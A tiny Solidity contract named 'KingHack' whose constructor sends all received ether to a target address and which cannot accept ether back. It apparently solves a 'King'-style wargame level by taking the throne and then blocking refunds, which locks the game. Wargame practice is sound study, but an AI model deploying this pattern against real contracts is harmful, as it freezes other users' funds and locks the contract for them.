pragma solidity ^0.4.18;

contract KingHack {
    
    constructor(address _targetAddr) public payable {
        address(_targetAddr).call.value(msg.value)();
    }
    
}
